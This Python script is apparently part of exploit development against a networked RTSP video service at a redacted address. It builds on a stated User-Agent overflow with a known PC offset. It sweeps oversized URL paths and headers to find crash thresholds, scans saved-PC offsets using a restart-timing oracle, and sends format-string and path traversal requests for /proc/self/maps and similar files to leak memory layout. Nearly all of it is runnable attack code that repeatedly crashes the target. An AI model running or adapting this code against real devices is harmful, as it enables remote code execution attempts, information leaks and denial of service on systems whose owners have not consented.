#!/usr/bin/env python3
"""
rtsp_url_overflow.py — Test RTSP URL path, Accept, Transport, CSeq fields for overflow.

User-Agent overflow @ PC_OFFSET=248 is confirmed but address probes all give SIGSEGV.
Testing other fields:
  - URL path (in DESCRIBE rtsp://ip:port/<PATH>): different parse code path, likely stack buf
  - Accept: application/sdp — content negotiation parsing
  - Transport: client_port=6970-6971 — setup request parsing
  - Require: — extension negotiation
  - Via: — proxy header

If any field has STACK overflow (vs heap), saved PC will be at a different,
predictable offset and may give different gadget reachability.

RTSP oracle timing:
  < 4s  → SIGSEGV (bad/NX address, immediate crash)
  4-70s → HIT zone (code executed before crash)
  >70s  → kernel panic / full reboot (kernel-space or special fault)
  90s   → poll timeout (looping? watchdog dead?)
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
HTTP_PORT = 80
BASE_URL  = b"rtsp://█████████████:554"

ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1, R1
ARM_LOOP = b'\xfe\xff\xff\xea'   # B .


def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False


def http_alive(timeout=4):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
        d = s.recv(256)
        s.close()
        return b"HTTP" in d or b"html" in d.lower()
    except:
        return False


def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            elapsed = time.time() - t0
            if elapsed > 2:
                print(f"  [✓] RTSP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP not alive after {max_wait}s ({label})", flush=True)
    return False


def send_rtsp_raw(request_bytes, timeout=8):
    """Send raw RTSP bytes, return (response, connected)."""
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(request_bytes)
        resp = b""
        try: resp = s.recv(512)
        except: pass
        s.close()
        return resp, True
    except Exception as e:
        return b"", False


def oracle_rtsp(request_bytes, label="", poll_timeout=90):
    """
    Send RTSP request, measure time until RTSP recovers.
    Returns restart_time (float) or poll_timeout if no restart seen.
    """
    if not wait_rtsp(max_wait=60, label="pre"):
        print(f"  [!] RTSP dead before test, aborting: {label}", flush=True)
        return None

    print(f"  [→] {label}", flush=True)
    t0 = time.time()
    send_rtsp_raw(request_bytes)

    PROBE = (b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n")
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 10:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                elapsed = time.time() - t0
                tag = "SIGSEGV" if elapsed < 4 else ("HIT?" if elapsed < 70 else "PANIC")
                print(f"  [★] RTSP restart T+{elapsed:.1f}s [{tag}]", flush=True)
                return elapsed
        except:
            pass
    print(f"  [?] No restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)


def classify(t, poll_timeout=90):
    if t is None:       return "SKIP"
    if t < 4:           return "SIGSEGV"
    if t < 70:          return "HIT"
    if t < poll_timeout: return "PANIC"
    return "LOOP/DEAD"


# ─── Part 1: URL path overflow threshold ────────────────────────────────────────

print("=" * 70)
print("Part 1: RTSP URL path overflow — find crash threshold")
print("=" * 70)
print("  Normal: DESCRIBE rtsp://ip:port/Streaming/Channels/1 RTSP/1.0")
print("  Test:   DESCRIBE rtsp://ip:port/<AAAAAA...> RTSP/1.0")
print()

# First verify what a normal DESCRIBE returns
req_normal = (b"DESCRIBE rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
              b"CSeq: 1\r\nUser-Agent: TestClient\r\n"
              b"Accept: application/sdp\r\n\r\n")
resp, _ = send_rtsp_raw(req_normal)
print(f"  Normal DESCRIBE /Streaming/Channels/1 → {resp[:80]!r}", flush=True)
print()

url_crash_threshold = None
prev_resp = None

for size in range(50, 600, 25):
    path = b"A" * size
    req = (b"DESCRIBE rtsp://█████████████:554/" + path + b" RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: TestURL\r\n\r\n")
    resp, connected = send_rtsp_raw(req)
    crashed = not connected or len(resp) == 0
    resp_preview = resp[:30]
    print(f"  URL_path size={size:4d}  resp={resp_preview!r}  {'CRASH?' if crashed else 'ok'}", flush=True)
    if crashed and not (prev_resp is None and size == 50):
        # Verify it's repeatable
        time.sleep(0.5)
        resp2, c2 = send_rtsp_raw(req)
        if not c2 or len(resp2) == 0:
            print(f"  → Confirmed crash at size={size}, binary-searching...")
            lo, hi = size - 25, size
            while lo < hi - 1:
                mid = (lo + hi) // 2
                path_m = b"A" * mid
                req_m = (b"DESCRIBE rtsp://█████████████:554/" + path_m + b" RTSP/1.0\r\n"
                         b"CSeq: 1\r\nUser-Agent: TestURL\r\n\r\n")
                resp_m, c_m = send_rtsp_raw(req_m)
                if not c_m or len(resp_m) == 0:
                    hi = mid
                else:
                    lo = mid
                time.sleep(0.3)
            url_crash_threshold = hi
            print(f"  URL_PATH THRESHOLD: crash at {hi}, ok at {lo}")
            break
    prev_resp = resp
    time.sleep(0.15)
else:
    print(f"  No URL path crash found up to 600 bytes")

print()
time.sleep(5)
wait_rtsp(max_wait=120, label="after URL scan")


# ─── Part 2: URL path PC offset scan (if crash found) ───────────────────────────

if url_crash_threshold:
    print()
    print("=" * 70)
    print(f"Part 2: URL path PC offset scan (threshold={url_crash_threshold})")
    print("=" * 70)

    # Baseline: all A's at threshold
    label = f"URL baseline {url_crash_threshold}B all-A"
    req_base = (b"DESCRIBE rtsp://█████████████:554/" + b"A" * url_crash_threshold + b" RTSP/1.0\r\n"
                b"CSeq: 1\r\nUser-Agent: TestURL\r\n\r\n")
    t_base = oracle_rtsp(req_base, label=label, poll_timeout=90)
    print(f"  baseline={t_base:.1f}s → {classify(t_base)}", flush=True)
    time.sleep(5)
    wait_rtsp(max_wait=120, label="after baseline")

    # Scan PC offsets
    NULL_PC = struct.pack('<I', 0x00000000)
    for pc_off in range(0, min(256, url_crash_threshold + 128), 8):
        if pc_off < url_crash_threshold:
            continue
        path = b"A" * pc_off + NULL_PC + b"A" * 32
        req = (b"DESCRIBE rtsp://█████████████:554/" + path + b" RTSP/1.0\r\n"
               b"CSeq: 1\r\nUser-Agent: TestURL\r\n\r\n")
        label = f"URL PC_off={pc_off} NULL_PC"
        t = oracle_rtsp(req, label=label, poll_timeout=90)
        print(f"  PC_off={pc_off:4d}  t={t:.1f}s  {classify(t)}", flush=True)
        if classify(t) == "SIGSEGV":
            print(f"  *** FAST SIGSEGV at PC_off={pc_off} — possible PC control! ***", flush=True)
        time.sleep(5)
        wait_rtsp(max_wait=120, label=f"after PC_off={pc_off}")


# ─── Part 3: Accept header overflow ──────────────────────────────────────────────

print()
print("=" * 70)
print("Part 3: Accept header overflow")
print("=" * 70)

accept_crash_threshold = None
for size in [64, 128, 200, 256, 300, 400, 512]:
    accept_val = b"application/sdp;" + b"A" * size
    req = (b"DESCRIBE rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: TestAccept\r\n"
           b"Accept: " + accept_val + b"\r\n\r\n")
    resp, connected = send_rtsp_raw(req)
    crashed = not connected or len(resp) == 0
    print(f"  Accept size={size:4d}  resp={resp[:25]!r}  {'CRASH?' if crashed else 'ok'}", flush=True)
    if crashed:
        accept_crash_threshold = size
        print(f"  Accept header CRASH at ~{size} bytes!")
        break
    time.sleep(0.2)

if not accept_crash_threshold:
    print("  No Accept header crash found")

time.sleep(5)
wait_rtsp(max_wait=120, label="after Accept test")


# ─── Part 4: Transport header overflow ────────────────────────────────────────

print()
print("=" * 70)
print("Part 4: Transport header overflow (SETUP request)")
print("=" * 70)

transport_crash = None
for size in [64, 128, 200, 256, 400, 512]:
    transport_val = b"RTP/AVP;unicast;client_port=" + b"1" * size
    req = (b"SETUP rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
           b"CSeq: 2\r\nUser-Agent: TestTransport\r\n"
           b"Transport: " + transport_val + b"\r\n\r\n")
    resp, connected = send_rtsp_raw(req)
    crashed = not connected or len(resp) == 0
    print(f"  Transport size={size:4d}  resp={resp[:25]!r}  {'CRASH?' if crashed else 'ok'}", flush=True)
    if crashed:
        transport_crash = size
        print(f"  Transport CRASH at ~{size} bytes!")
        break
    time.sleep(0.2)

if not transport_crash:
    print("  No Transport crash found")

time.sleep(5)
wait_rtsp(max_wait=120, label="after Transport test")


# ─── Part 5: Require / Session header overflow ─────────────────────────────────

print()
print("=" * 70)
print("Part 5: Require + Session headers")
print("=" * 70)

for hdr_name in [b"Require", b"Session", b"Via", b"Range", b"Scale"]:
    for size in [128, 256, 400, 512]:
        val = b"A" * size
        req = (b"DESCRIBE rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
               b"CSeq: 1\r\nUser-Agent: test\r\n"
               + hdr_name + b": " + val + b"\r\n\r\n")
        resp, connected = send_rtsp_raw(req)
        crashed = not connected or len(resp) == 0
        if crashed:
            print(f"  {hdr_name.decode()} size={size}  CRASH!", flush=True)
            # Wait for recovery
            time.sleep(5)
            wait_rtsp(max_wait=90, label=f"after {hdr_name.decode()} crash")
            break
        time.sleep(0.1)
    else:
        print(f"  {hdr_name.decode()}: no crash up to 512 bytes", flush=True)


# ─── Part 6: Info-leak check ─────────────────────────────────────────────────

print()
print("=" * 70)
print("Part 6: Info-leak via malformed RTSP + HTTP error responses")
print("=" * 70)

# Try RTSP methods with format strings to see if server echoes them back
fmtstr_tests = [
    (b"DESCRIBE", b"rtsp://█████████████:554/%s%s%s%s%s%s%s%s RTSP/1.0\r\nCSeq: 1\r\n\r\n"),
    (b"OPTIONS",  b"OPTIONS rtsp://█████████████:554/%p%p%p%p%p%p RTSP/1.0\r\nCSeq: 1\r\n\r\n"),
    (b"DESCRIBE", b"DESCRIBE rtsp://█████████████:554/%x%x%x%x%x%x RTSP/1.0\r\nCSeq: 1\r\n\r\n"),
]

for _, req_bytes in fmtstr_tests:
    resp, connected = send_rtsp_raw(req_bytes)
    print(f"  FMT → {resp[:120]!r}", flush=True)
    time.sleep(0.3)

# HTTP error leaks
import socket as _socket
http_fmtstr_tests = [
    b"GET /%s%s%s%s%p%p%x%x HTTP/1.0\r\nHost: test\r\n\r\n",
    b"GET /../../../../../../../../proc/self/maps HTTP/1.0\r\nHost: test\r\n\r\n",
    b"GET /proc/self/cmdline HTTP/1.0\r\nHost: test\r\n\r\n",
    b"GET /proc/self/maps HTTP/1.0\r\nHost: test\r\n\r\n",
    b"GET /proc/version HTTP/1.0\r\nHost: test\r\n\r\n",
    b"GET /proc/net/tcp HTTP/1.0\r\nHost: test\r\n\r\n",
]

for req_bytes in http_fmtstr_tests:
    try:
        s = _socket.socket(); s.settimeout(6)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(req_bytes)
        resp = b""
        try: resp = s.recv(1024)
        except: pass
        s.close()
        path = req_bytes.split(b' ')[1][:40]
        print(f"  HTTP {path!r} → {resp[:120]!r}", flush=True)
    except Exception as e:
        print(f"  HTTP req failed: {e}", flush=True)
    time.sleep(0.2)

print("\nDone.")
